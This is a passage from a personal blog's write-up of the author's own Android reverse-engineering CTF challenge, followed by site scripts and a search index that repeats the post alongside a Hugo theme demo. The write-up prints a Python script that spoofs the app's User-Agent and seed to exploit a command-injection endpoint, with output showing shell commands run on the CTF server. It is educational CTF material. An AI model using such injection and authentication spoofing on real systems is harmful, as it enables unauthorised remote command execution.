<p>From this URL we can see it takes a <code>command</code>. Lastly, the server seems to expect <code>okhttp</code> which is the reason why the app is able to ping the server and not the website.</p>
<p>Okhttp specifies the <code>User-Agent</code> on is packets as <code>Okhttp3</code>. But the server isn&rsquo;t that strict with checking it.</p>
<h1 id="the-finale">The Finale</h1>
<p>Now we have everything we need to do to beat the challenge.</p>
<p>The methodology is that we need to send a packet, exploiting the command injection in <code>/experiment</code>. This packet must contain the <code>Okttp</code> User-Agent. Lastly, the payload need to contain a rolled(SHA256 hash) version of a <code>seed</code> or previous <code>code</code> on the server.</p>
<p>My original solution was using <a href="https://frida.re/"  target="_blank" rel="noreferrer nofollow">Frida</a>
 to log the seed value from the app when ran. Then crafting a packet using that in Python. But there is a simpler way of spoofing the app with your own seed.</p>
<p>That version is below&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;okhttp&#39;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">seed</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;SEED:</span><span class="se">\x01\x01\x02\x03</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">URL0</span> <span class="o">=</span> <span class="s1">&#39;http://the-andro-experiment.ctf.ritsec.club/ping&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL0</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">seed</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter command: &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">URL1</span><span class="o">=</span><span class="s1">&#39;http://the-andro-experiment.ctf.ritsec.club/experiment?command=&#39;</span> <span class="o">+</span> <span class="n">command</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01\x01\x02\x03</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p>As you can see, we send the seed at first to <code>/ping</code> using <code>requests</code> with the <code>okhttp</code> User-Agent. This allows the user to then send the command given through user input to <code>URL1</code>. We hash the seed ourselves and replace the data of the request with that. Then we get our result.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ ./simple_pwn.py
</span></span><span class="line"><span class="cl">Enter command: ls
</span></span><span class="line"><span class="cl">entrypoint.sh
</span></span><span class="line"><span class="cl">flag.txt
</span></span><span class="line"><span class="cl">main.py
</span></span><span class="line"><span class="cl">requirements.txt
</span></span><span class="line"><span class="cl">static
</span></span><span class="line"><span class="cl">templates
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ./simple_pwn.py
</span></span><span class="line"><span class="cl">Enter command: cat flag.txt
</span></span><span class="line"><span class="cl">RS<span class="o">{</span>th3_myst3ry_k33ps_unf0ld1ng<span class="o">}</span>
</span></span></code></pre></div><p>Flag: <code>RS{th3_myst3ry_k33ps_unf0ld1ng}</code></p>
<h6 id="photo-created-with-image-by-briana-graham-on-unsplash">Photo created with image by <a href="https://unsplash.com/@bri_gee?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Briana Graham</a> on <a href="https://unsplash.com/photos/red-and-gray-abstract-painting-Z4_CHj4Mb28?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Unsplash</a></h6>
</main>



<br>

<footer>

<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now();
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener("scroll", throttle(scrollCallback, 200));
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    
    const codeBlocks = document.querySelectorAll(
      'code[class^="language-"]:not(.output):not([class*="language-console"])',
    );

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>

<script>
window.store = {
    
    "http:\/\/localhost:1313\/post\/": {
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/post\/"
    },
    
    "http:\/\/localhost:1313\/tags\/android\/": {
        "title": "Android",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/android\/"
    },
    
    "http:\/\/localhost:1313\/": {
        "title": "chasek blog",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/"
    },
    
    "http:\/\/localhost:1313\/tags\/ctf\/": {
        "title": "CTF",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/ctf\/"
    },
    
    "http:\/\/localhost:1313\/tags\/reverse-engineering\/": {
        "title": "Reverse Engineering",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/reverse-engineering\/"
    },
    
    "http:\/\/localhost:1313\/tags\/": {
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/"
    },
    
    "http:\/\/localhost:1313\/post\/the_andro_experiment\/2024-05-21-the-andro-experiment\/": {
        "title": "The Andro Experiment",
        "tags": ["Android","CTF","Reverse Engineering",],
        "content": "The Andro Experiment Hello! I made this Android RE CTF challenge you can find here on my github.\nI highly suggest hosting the challenge and solving it yourself first, and/or following along with this.\nSo let\u0026rsquo;s walk through the solution and thought process!\nWhat is happening Hey, it\u0026#39;s Chase again. I did some more research into some of the experiments Anthony was doing and found this website. Something about an android application calling back to a server, so once again see if there is any information on the server about him? https://the-andro-experiment.ctf.ritsec.club/ To start you are told that you have an android app that is calling back to a server. You are then greeted with this website\u0026hellip;\nhttp://the-andro-experiment.ctf.ritsec.club From either of the download links you can download Andro.apk. There is also, the ping link on the navbar that doesn\u0026rsquo;t actually increment the App Ping Number.\nThis number not incrementing by the website is a hint towards something the app is doing that allows that number to increment.\nWhat you\u0026rsquo;re supposed to do Running The App Right off the bat I would throw this in an emulator or push it onto an actual device if you have one.\nI\u0026rsquo;m using the Android Studio Emulator on a Pixel_3a_API_34_extension_level_7_x86_64\nThis challenge can be done with static reversing, but detonating someone random\u0026rsquo;s \u0026ldquo;CTF Challenge\u0026rdquo; is always a good idea to gain more information.\nWhen you first run the app you are greeted with this\u0026hellip;\nThe first thought is a free flag in base64 but when you decode it you get\n“There is no real ending. It’s just the place where you stop the story.” ― Frank Herbert\n\u0026hellip;this is just a Dune quote\nWhat\u0026rsquo;s important is the Server Authenticated toast that popped up, and the Ping Server button visible.\nWhen the Ping Server button is clicked you get this back\u0026hellip;\nThe ping worked!\nYou may receive an error message when running this or starting the app, if so, the server is most likely down.\nThis is all the real functionality of the app, but this will give context to the functionality of the app we see later.\nReversing The App Opening Andro.apk in Jadx shows us a lot\u0026hellip;\nThese in the MainActivity are important:\nseed - seed value variable used in server authentication\ngenerateSeed() function to generate the seed value\nperformGetRequest() function for sending a GET request to the server\nrollCode() function for reauthing with the server every request\nsendBytesToServer() function for sending data to the server\nHeads up these function names arent entirely indicative of what the function actually does, so let\u0026rsquo;s see what they do below.\nIn the main activity, we see\u0026hellip;\npublic class MainActivity extends AppCompatActivity { static byte[] seed = new byte[0]; ExecutorService executor = Executors.newFixedThreadPool(10); public native byte[] generateSeed(); public native byte[] rollCode(byte[] bArr); /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(C0570R.layout.activity_main); System.loadLibrary(\u0026#34;andro\u0026#34;); // \u0026lt; System.loadLibrary(\u0026#34;ssl\u0026#34;); // \u0026lt;-- These 3 lines System.loadLibrary(\u0026#34;crypto\u0026#34;); // \u0026lt; seed = generateSeed(); performGetRequest(); Button myButton = (Button) findViewById(C0570R.C0573id.button); myButton.setOnClickListener(new View.OnClickListener() { // from class: com.example.andro.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View v) { Log.d(\u0026#34;rollcode\u0026#34;, \u0026#34;OnClick\u0026#34; + Arrays.toString(MainActivity.seed)); MainActivity.seed = MainActivity.this.rollCode(MainActivity.seed); MainActivity.this.sendBytesToServer(MainActivity.seed); } }); } You can see on the lines starting with System.loadLibrary.\nThere are some native libraries being imported, these contain the native functions referenced later.\nOtherwise, on start, we generate our seed with generateSeed() and then run performGetRequest().\nThen we simply wait for the button to be clicked. If clicked, the seed value is logged, then we run the rollcode() function using that original seed. Then that seed is sent to the server with sendBytesToServer().\nperformGetRequest() private void performGetRequest() { byte[] result = new byte[\u0026#34;SEED:\u0026#34;.length() + 4]; for (int i = 0; i \u0026lt; \u0026#34;SEED:\u0026#34;.length(); i++) { result[i] = \u0026#34;SEED:\u0026#34;.getBytes()[i]; } for (int i2 = 0; i2 \u0026lt; seed.length; i2++) { result[\u0026#34;SEED:\u0026#34;.length() + i2] = seed[i2]; } sendBytesToServer(result); } This function sends the seed, with the prefix of SEED: to the sendBytesToServer() function.\nAll the loops just convert the strings to bytes, otherwise, let\u0026rsquo;s see what happens to the result after it\u0026rsquo;s sent.\nsendBytesToServer() public void sendBytesToServer(final byte[] code) { this.executor.execute(new Runnable() { // from class: com.example.andro.MainActivity.2 @Override // java.lang.Runnable public void run() { MediaType RAW = MediaType.get(\u0026#34;application/octet-stream\u0026#34;); OkHttpClient client = new OkHttpClient(); RequestBody body = RequestBody.create(code, RAW); Request request = new Request.Builder().url(\u0026#34;http://the-andro-experiment.ctf.ritsec.club/ping\u0026#34;).post(body).build(); try { Response response = client.newCall(request).execute(); MainActivity.this.runOnUiThread(new Runnable() { // from class: com.example.andro.MainActivity.2.1 @Override // java.lang.Runnable public void run() { if (code[0] != 83) { Toast.makeText(MainActivity.this, \u0026#34;Ping Sent\u0026#34;, 0).show(); } else { Toast.makeText(MainActivity.this, \u0026#34;Server Authenticated\u0026#34;, 0).show(); } } }); if (response != null) { response.close(); } } catch (IOException e) { Log.d(\u0026#34;MainErr\u0026#34;, e.toString()); MainActivity.this.runOnUiThread(new Runnable() { // from class: com.example.andro.MainActivity.2.2 @Override // java.lang.Runnable public void run() { Toast.makeText(MainActivity.this, \u0026#34;Could Not Send\u0026#34;, 0).show(); } }); } } }); } Going top down, we can see that the functions deals with some threading with Runnables.\nThis prepares the OkHTTPClient for the request we\u0026rsquo;re sending. In the body we send the code(seed) that was generated before in the body. The request is sent to the website from before, but at /ping.\nhttp://the-andro-experiment.ctf.ritsec.club/ping If you remember from before pinging the server on the website didn\u0026rsquo;t work, but pinging it from the app did. This is because of OkHTTP we\u0026rsquo;ll see that later too.\nWe then try running it. If successful we make the toast with Ping Sent. Unless the first bytes of code is 83 (which is the letter S). Then, we toast Server Authenticated.\nIf this was the seed from performGetRequest it means we authenticated. It is simply checking if we prefixes the seed with SEED:.\nBoth we saw before when we ran the app.\nOtherwise, we catch any errors and clean up.\nReversing the Library If you remember the app imported some libraries and got the functions generateSeed() and rollCode() within the Java part of the app. Let\u0026rsquo;s dig into those.\nFirst, we have to open up the apk which contains other files inside (similar to a .zip) using apktool .\nRunning this on the apk will give us access to the libraries inside.\n$ apktool d Andro.apk -f\nNow we have these\u0026hellip;\n$ ls Andro/lib/x86_64 libandro.so libcrypto.so libssl.so The libraries libcrypto and libssl aren\u0026rsquo;t important for us here. The one with the challenge\u0026rsquo;s namesake libandro is it.\nOpening up libandro in Binary Ninja we can see the functions on the left side, clicking on the ones we saw in jadx may return this\u0026hellip;\nA lot of terrible JNI functions, these aren\u0026rsquo;t important for the function implementation they\u0026rsquo;re just for using them within the Java.\nThe actual implementation is usually right next to it.\nUsing Pseudo C the generateSeed() function looks like this\u0026hellip;\nAs you can see when we generate the seed, we\u0026rsquo;re actually just taking 4 bytes from /dev/urandom.\nInside of the rollCode() function, we see this\u0026hellip;\nIt is a simple SHA256 hash every times using that crypto library.\nReferencing the Java code earlier\u0026hellip;\npublic void onClick(View v) { Log.d(\u0026#34;rollcode\u0026#34;, \u0026#34;OnClick\u0026#34; + Arrays.toString(MainActivity.seed)); MainActivity.seed = MainActivity.this.rollCode(MainActivity.seed); MainActivity.this.sendBytesToServer(MainActivity.seed); } It seems like there is a rolling code system that rolls the previous code/seed with the server every time it sends the next ping.\nFinally, if you looked further in the library you would\u0026rsquo;ve seen this piece of deprecated code\u0026hellip;\nThis tells us about this unimplemented command_server() function, which uses /experiment.\nFrom this URL we can see it takes a command. Lastly, the server seems to expect okhttp which is the reason why the app is able to ping the server and not the website.\nOkhttp specifies the User-Agent on is packets as Okhttp3. But the server isn\u0026rsquo;t that strict with checking it.\nThe Finale Now we have everything we need to do to beat the challenge.\nThe methodology is that we need to send a packet, exploiting the command injection in /experiment. This packet must contain the Okttp User-Agent. Lastly, the payload need to contain a rolled(SHA256 hash) version of a seed or previous code on the server.\nMy original solution was using Frida to log the seed value from the app when ran. Then crafting a packet using that in Python. But there is a simpler way of spoofing the app with your own seed.\nThat version is below\u0026hellip;\n#!/usr/bin/env python3 import requests import hashlib def main(): headers = {\u0026#39;User-Agent\u0026#39;: \u0026#39;okhttp\u0026#39;} seed = b\u0026#39;SEED:\\x01\\x01\\x02\\x03\u0026#39; URL0 = \u0026#39;http://the-andro-experiment.ctf.ritsec.club/ping\u0026#39; response = requests.post(url=URL0, data=seed, headers=headers) command = input(\u0026#34;Enter command: \u0026#34;) URL1=\u0026#39;http://the-andro-experiment.ctf.ritsec.club/experiment?command=\u0026#39; + command payload = hashlib.sha256(b\u0026#39;\\x01\\x01\\x02\\x03\u0026#39;).digest() response = requests.post(url=URL1, data=payload, headers=headers) print(response.text) if __name__ == \u0026#34;__main__\u0026#34;: main() As you can see, we send the seed at first to /ping using requests with the okhttp User-Agent. This allows the user to then send the command given through user input to URL1. We hash the seed ourselves and replace the data of the request with that. Then we get our result.\n$ ./simple_pwn.py Enter command: ls entrypoint.sh flag.txt main.py requirements.txt static templates $ ./simple_pwn.py Enter command: cat flag.txt RS{th3_myst3ry_k33ps_unf0ld1ng} Flag: RS{th3_myst3ry_k33ps_unf0ld1ng}\nPhoto created with image by Briana Graham on Unsplash ", 
        "url": "http:\/\/localhost:1313\/post\/the_andro_experiment\/2024-05-21-the-andro-experiment\/"
    },
    
    "http:\/\/localhost:1313\/tags\/hugo\/": {
        "title": "Hugo",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/hugo\/"
    },
    
    "http:\/\/localhost:1313\/post\/hugo-dead-simple\/": {
        "title": "Hugo dead simple theme",
        "tags": ["hugo",],
        "content": "Simple hugo theme to be dead easy on the reader.\nInstallation Initialize go module\nhugo mod init \u0026lt;module_path\u0026gt; Add theme to your config.yml\nmodule: imports: - path: github.com/barklan/hugo-dead-simple Fetch theme\nhugo mod get -u Configuration Site parameters This site\u0026rsquo;s config can be found here .\nSection parameters 1--- 2title: \u0026#34;Section title\u0026#34; 3weight: 1 4nodate: false # display date next to post title 5--- Page parameters 1--- 2title: \u0026#34;Post/Page title\u0026#34; 3subtitle: \u0026#34;...example subtitle\u0026#34; 4date: \u0026#34;2023-08-11\u0026#34; 5toc: true # table of contents (only h2 and h3 added to toc) 6bold: true # display post title in bold in posts list 7categories: 8 - ... 9tags: 10 - ... 11next: true # show link to next post in footer 12nomenu: true # hide site menu 13notitle: true # hide title 14--- Deployment Generate and add favicons to /static\nDeploy your site to Netlify with this netlify.toml\n1[build] 2publish = \u0026#34;public\u0026#34; 3command = \u0026#34;hugo --gc --minify\u0026#34; 4 5[context.production] 6environment = { HUGO_VERSION = \u0026#34;0.144.0\u0026#34; } Post features Hugo shortcodes\nIn all examples you’ll need to adjust code so the % or \u0026lt; are touching the { like this: {%.\nFootnotes Here\u0026#39;s a sentence with a footnote.[^1] [^1]: This is unnamed footnote. Here\u0026rsquo;s a sentence with a footnote.1\nMark \u0026lt;mark\u0026gt;Marked text\u0026lt;/mark\u0026gt; Marked text\nBoxes {{\u0026lt; box info \u0026gt;}} **This is a bold line** Hello there, and have a nice day {{\u0026lt; /box \u0026gt;}} info, tip, warning, important\nThis is a bold line\nHello there, and have a nice day\nHello there, and have a nice day\nHello there, and have a nice day\nHello there, and have a nice day\nCollapsible \u0026lt;details\u0026gt; \u0026lt;summary\u0026gt;Collapsible\u0026lt;/summary\u0026gt; ![rose](./pinkrose.avif) \u0026lt;/details\u0026gt; Collapsible some code Tables Use table generator .\nCode Code blocks support usual Hugo highlighting features. Additionally \u0026ldquo;copy\u0026rdquo; button is added to each code block automatically.\n```go {linenos=inline,hl_lines=[2, \u0026#34;6-9\u0026#34;],linenostart=19} // ... code ``` Produces:\n19func randPass(n uint8, extraChars string) (string, error) { 20\tconst base = \u0026#34;0123456789abcdefghijklmnopqrstuvwxyz-\u0026#34; 21\tletters := base + extraChars 22\tret := make([]byte, n) 23\tvar i uint8 24\tfor i = 0; i \u0026lt; n; i++ { 25\tnum, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) 26\tif err != nil { 27\treturn \u0026#34;\u0026#34;, err 28\t} 29\tret[i] = letters[num.Int64()] 30\t} 31 32\treturn string(ret), nil 33} Smaller code ```go {.fs90} num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) ``` Produces:\nnum, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters)))) Available classes: fs95, fs90, fs85, fs80, fs75, fs70 and fs50.\nKaTeX Inline \\(\\pi = 3.14\\) π=3.14\\pi = 3.14π=3.14\nBlock $$ \\begin{align} \\sqrt{37} \u0026amp; = \\sqrt{\\frac{73^2-1}{12^2}} \\\\ \u0026amp; = \\sqrt{\\frac{73^2}{12^2}\\cdot\\frac{73^2-1}{73^2}} \\\\ \u0026amp; = \\frac{73}{12}\\sqrt{1 - \\frac{1}{73^2}} \\\\ \u0026amp; \\approx \\frac{73}{12}\\left(1 - \\frac{1}{2\\cdot73^2}\\right) \\end{align} $$ 37=732−1122=732122⋅732−1732=73121−1732≈7312(1−12⋅732) \\begin{align} \\sqrt{37} \u0026amp; = \\sqrt{\\frac{73^2-1}{12^2}} \\\\ \u0026amp; = \\sqrt{\\frac{73^2}{12^2}\\cdot\\frac{73^2-1}{73^2}} \\\\ \u0026amp; = \\frac{73}{12}\\sqrt{1 - \\frac{1}{73^2}} \\\\ \u0026amp; \\approx \\frac{73}{12}\\left(1 - \\frac{1}{2\\cdot73^2}\\right) \\end{align} 37​​=122732−1​​=122732​⋅732732−1​​=1273​1−7321​​≈1273​(1−2⋅7321​)​​Note that if you don\u0026rsquo;t want automatic numbering you can use \\begin{align*}.\nChemistry \\[ \\tag*{(2)} \\ce{Zn^2+ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{amphoteric hydroxide}}{\\ce{Zn(OH)2 v}}$ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{tetrahydroxozincate}}{\\ce{[Zn(OH)4]^2-}}$} \\] ZnX2+⇌+2 HX++2 OHX−Zn(OH)X2↓amphoteric hydroxide⇌+2 HX++2 OHX−[Zn(OH)X4]X2−tetrahydroxozincate \\ce{Zn^2+ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{amphoteric hydroxide}}{\\ce{Zn(OH)2 v}}$ \u0026lt;=\u0026gt;[+ 2OH-][+ 2H+] $\\underset{\\text{tetrahydroxozincate}}{\\ce{[Zn(OH)4]^2-}}$} ZnX2++2OHX−+2HX+​amphoteric hydroxideZn(OH)X2​↓​+2OHX−+2HX+​tetrahydroxozincate[Zn(OH)X4​]X2−​Use supported functions and support table for reference.\nFile trees Use tree.nathanfriend.io to make beautiful file tree structures like this one:\n. ├── tmp/ │ ├── __init__.py │ └── temp.py ├── src/ │ ├── __init__.py │ └── main.py └── Dockerfile Images General All images are lazy-loaded. You can use the usual ![image](./image.png) to insert images.\nInternally it uses imgp class. You can customize images like this:\n\u0026lt;p class=\u0026#34;imgp\u0026#34;\u0026gt; \u0026lt;img style=\u0026#34;max-height: 50vh; border: 6px solid var(--complimentary);\u0026#34; src=\u0026#34;./pinkrose.avif\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; Figure element {{\u0026lt; figure src=\u0026#34;./pinkrose.avif\u0026#34; title=\u0026#34;An elephant at sunset\u0026#34; \u0026gt;}} As with images, you can customize figure:\n\u0026lt;figure\u0026gt; \u0026lt;img loading=\u0026#34;lazy\u0026#34; style=\u0026#34;max-height: 50vh;\u0026#34; src=\u0026#34;./pinkrose.avif\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;Pink rose\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; Pink rose Plots To make the charts look good use this context manager:\nimport matplotlib.pyplot as plt import matplotlib as mpl import numpy as np import seaborn as sns class Blog: def __init__(self, filename, figsize=(6, 6), axis=True): self.filename = filename self.figsize = figsize self.axis = axis def set_plot(self, figsize=(6, 6)): sns.set() sns.set_theme(style=\u0026#34;white\u0026#34;, palette=\u0026#34;bright\u0026#34;) COLOR = \u0026#34;grey\u0026#34; mpl.rcParams[\u0026#34;text.color\u0026#34;] = COLOR mpl.rcParams[\u0026#34;axes.labelcolor\u0026#34;] = COLOR mpl.rcParams[\u0026#34;xtick.color\u0026#34;] = COLOR mpl.rcParams[\u0026#34;ytick.color\u0026#34;] = COLOR plt.figure(figsize=self.figsize) sns.set_context(\u0026#34;paper\u0026#34;) def save_plot(self): if self.axis: plt.axis(\u0026#34;on\u0026#34;) else: plt.axis(\u0026#34;off\u0026#34;) plt.savefig(self.filename, format=\u0026#34;svg\u0026#34;, bbox_inches=\u0026#34;tight\u0026#34;, pad_inches=0.3, transparent=True) def __enter__(self): self.set_plot() return self def __exit__(self, exc_type, exc_value, exc_traceback): self.save_plot() Then you can use it like this\nx = np.arange(0, 10, 0.00001) y = x * np.sin(2 * np.pi * x) fmri = sns.load_dataset(\u0026#34;fmri\u0026#34;) with Blog(\u0026#34;fmri.svg\u0026#34;, figsize=(7, 7), axis=True): sns.lineplot(x=\u0026#34;timepoint\u0026#34;, y=\u0026#34;signal\u0026#34;, hue=\u0026#34;region\u0026#34;, style=\u0026#34;event\u0026#34;, data=fmri) Looks good in light and dark mode!\nImage galleries You can create image galleries with this:\n\u0026lt;ul class=\u0026#34;image-gallery\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;figure\u0026gt; \u0026lt;img loading=\u0026#34;lazy\u0026#34; src=\u0026#34;./pinkrose.avif\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;Pink rose\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;figure\u0026gt; \u0026lt;img loading=\u0026#34;lazy\u0026#34; src=\u0026#34;./flower.avif\u0026#34; /\u0026gt; \u0026lt;figcaption\u0026gt;Pink rose\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; Pink rose Not a rose If you want three images in a row additionally add three-image-gallery class to ul.\nTwo images {{\u0026lt; twoimg \u0026#34;./pinkrose.avif\u0026#34; \u0026#34;./flower.avif\u0026#34; \u0026gt;}} Three images {{\u0026lt; threeimg \u0026#34;./pinkrose.avif\u0026#34; \u0026#34;./flower.avif\u0026#34; \u0026#34;./pinkrose.avif\u0026#34; \u0026gt;}} YouTube {{\u0026lt; youtube x6Ssz1WiKN8 \u0026gt;}} Attachments {{\u0026lt; attachments folder=\u0026#34;temp\u0026#34; title=\u0026#34;Boom\u0026#34; caption=\u0026#34;example\u0026#34; \u0026gt;}} title and caption can be omitted.\nBoom (example) temp.py 🔗 \u0026nbsp; (783b) Columns {{ % columns %}} #### Title 1 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026#39;s standard dummy text ever since the 1500s. \u0026lt;---\u0026gt; #### Title 2 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026#39;s standard dummy text ever since the 1500s {{ % /columns %}} Title 1 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026rsquo;s standard dummy text ever since the 1500s.\nTitle 2 Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry\u0026rsquo;s standard dummy text ever since the 1500s\nColumns with other elements An elephant at sunset An elephant at sunset Tabs {{\u0026lt; tabs \u0026gt;}} {{\u0026lt; tab \u0026#34;MacOS\u0026#34; \u0026gt;}} This is tab **MacOS** content. Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} This is tab **Linux** content. {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} This is tab **Windows** content. Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; /tabs \u0026gt;}} MacOS This is tab MacOS content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter!\nLinux This is tab Linux content. Windows This is tab Windows content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter!\nThis is unnamed footnote.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n", 
        "url": "http:\/\/localhost:1313\/post\/hugo-dead-simple\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
    "http:\/\/localhost:1313\/tags\/rest\/": {
